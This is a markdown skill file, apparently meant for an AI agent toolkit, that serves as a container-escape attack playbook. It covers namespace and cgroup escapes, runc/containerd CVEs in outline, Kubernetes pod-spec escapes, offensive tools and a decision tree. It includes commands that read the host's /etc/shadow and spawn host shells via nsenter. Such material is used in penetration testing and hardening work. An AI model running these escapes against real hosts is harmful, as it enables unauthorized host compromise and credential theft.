# SKILL: Container Escape Techniques — Expert Attack Playbook: detailed technique reference

<!-- zhiyugo:resource:start -->
> ZhiyuGo reference material only. Inspect it explicitly through catalog resource tooling when the main Skill names this file; examples do not grant tools, authorization, or evidence.
<!-- zhiyugo:resource:end -->

<!-- zhiyugo:toc:start -->
## Contents

- [6. CGROUP V2 / eBPF ESCAPE](#6-cgroup-v2-ebpf-escape)
- [7. NAMESPACE ESCAPE](#7-namespace-escape)
- [8. RUNTIME VULNERABILITIES](#8-runtime-vulnerabilities)
- [9. KUBERNETES POD ESCAPE](#9-kubernetes-pod-escape)
- [10. TOOLS](#10-tools)
- [11. CONTAINER ESCAPE DECISION TREE](#11-container-escape-decision-tree)
<!-- zhiyugo:toc:end -->

## 6. CGROUP V2 / eBPF ESCAPE

```bash
# Cgroup v2: no release_agent file
# Check cgroup version:
mount | grep cgroup
# cgroup2 → v2

# eBPF-based escape (requires CAP_SYS_ADMIN + CAP_BPF or equivalent)
# Kernel ≥ 5.8 with unprivileged eBPF enabled
cat /proc/sys/kernel/unprivileged_bpf_disabled
# 0 = eBPF available to unprivileged users
```

---

## 7. NAMESPACE ESCAPE

### User Namespace

```bash
# If user namespace creation is allowed inside container:
unshare -U --map-root-user bash
# Now "root" inside new namespace
# Combined with other capabilities → mount host filesystem
```

### PID Namespace Escape

```bash
# If hostPID: true (shared PID namespace with host)
# Access host processes directly:
ls /proc/1/root/          # Host's root filesystem
cat /proc/1/root/etc/shadow

# Inject into host process:
nsenter -t 1 -m -u -i -n -p -- bash
```

---

## 8. RUNTIME VULNERABILITIES

### runc CVE-2019-5736

Overwrites host runc binary when `docker exec` is used.

```bash
# Conditions: docker exec into a malicious container triggers exploit
# The container's /bin/sh is replaced with exploit binary
# When next exec happens → overwrites /usr/bin/runc on host

# PoC: modify entrypoint to overwrite runc
# This is a one-shot exploit — runc is replaced permanently
```

### containerd CVE-2020-15257

```bash
# Host network namespace shared + containerd < 1.3.9 / 1.4.3
# Abstract Unix socket accessible from container
# Connect to containerd shim API via @/containerd-shim/*.sock
```

### cgroups CVE-2022-0492

```bash
# Unpatched kernel allows cgroup escape without CAP_SYS_ADMIN
# release_agent writable by unprivileged user in container
```

---

## 9. KUBERNETES POD ESCAPE

| Dangerous Pod Spec | Escape |
|---|---|
| `hostPID: true` | `nsenter -t 1 -m -u -i -n -p -- bash` |
| `hostNetwork: true` | Access node services (Kubelet, etcd) directly |
| `hostPath: {path: /}` | `chroot /host bash` |
| `privileged: true` | Mount host disk / nsenter |
| SA token with RBAC | Create new privileged pod via API |

See `kubernetes-pentesting` for full K8s attack paths.

---

## 10. TOOLS

| Tool | Purpose | URL/Command |
|---|---|---|
| **deepce** | Docker enumeration + exploit suggestions | `./deepce.sh` |
| **CDK** | Container/K8s exploitation toolkit | `./cdk evaluate` |
| **amicontained** | Show container runtime, caps, seccomp | `./amicontained` |
| **PEIRATES** | Kubernetes penetration testing | `./peirates` |
| **BOtB** | Break out the Box — auto-escape | `./botb -autopwn` |

---

## 11. CONTAINER ESCAPE DECISION TREE

```
Inside a container?
│
├── Privileged mode? (CapEff = 0000003fffffffff)
│   ├── Yes → mount host disk (§2.1) or nsenter (§2.2)
│   └── Partial capabilities? Check each:
│       ├── CAP_SYS_ADMIN → cgroup release_agent (§5) or mount (§3.1)
│       ├── CAP_SYS_PTRACE + hostPID → process injection (§3.2)
│       ├── CAP_DAC_READ_SEARCH → shocker exploit (§3.4)
│       └── CAP_NET_ADMIN + hostNetwork → network manipulation (§3.3)
│
├── Docker socket mounted? (/var/run/docker.sock)
│   └── Yes → create privileged container (§4)
│
├── Host PID namespace shared?
│   └── Yes → nsenter -t 1 or /proc/1/root access (§7)
│
├── Cgroup v1?
│   └── + CAP_SYS_ADMIN → release_agent escape (§5)
│
├── Runtime vulnerable?
│   ├── runc < 1.0.0-rc6 → CVE-2019-5736 (§8)
│   └── containerd < 1.3.9 → CVE-2020-15257 (§8)
│
├── Kernel vulnerable?
│   └── Check KERNEL_EXPLOITS_CHECKLIST in linux-privilege-escalation
│
├── Kubernetes pod?
│   ├── Service account with elevated RBAC? → create escape pod (§9)
│   └── hostPath volume? → access host filesystem
│
└── None of the above?
    ├── Run deepce/CDK for automated detection
    ├── Check for writable host mount points
    ├── Enumerate network for other containers/services
    └── Check /proc/self/mountinfo for interesting mounts
```
